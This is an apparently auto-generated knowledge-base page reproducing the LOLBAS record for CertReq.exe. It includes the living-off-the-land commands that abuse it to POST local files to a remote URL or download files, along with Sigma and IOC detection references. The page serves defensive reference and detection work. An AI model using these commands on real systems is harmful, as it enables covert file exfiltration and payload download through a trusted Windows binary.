---
parsed_by: focuslocust
source: lolbas
type: generated
---
# CertReq.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `certreq.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certreq.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CertReq.exe](../../tools/windows/certreq.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | certreq.exe |
| name | CertReq.exe |
| type | tool |
| source | lolbas |
| url | https://dtm.uk/certreq |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@dtmsecurity'
  Person: David Middlehurst
Author: David Middlehurst
Commands:
- Category: Download
  Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
  Description: Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to
    the specified txt file (last argument).
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from Internet
- Category: Upload
  Command: CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
  Description: Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Upload
Created: 2020-07-07
Description: Used for requesting and managing certificates
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
- IOC: certreq creates new files
- IOC: certreq makes POST requests
Full_Path:
- Path: C:\Windows\System32\certreq.exe
- Path: C:\Windows\SysWOW64\certreq.exe
Name: CertReq.exe
Resources:
- Link: https://dtm.uk/certreq
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certreq.yml
```

## Detection / Analysis Notes

```text
IOC: certreq creates new files
```

```text
IOC: certreq makes POST requests
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_susp_certreq_download.yml
- IOC: certreq creates new files
- IOC: certreq makes POST requests
```
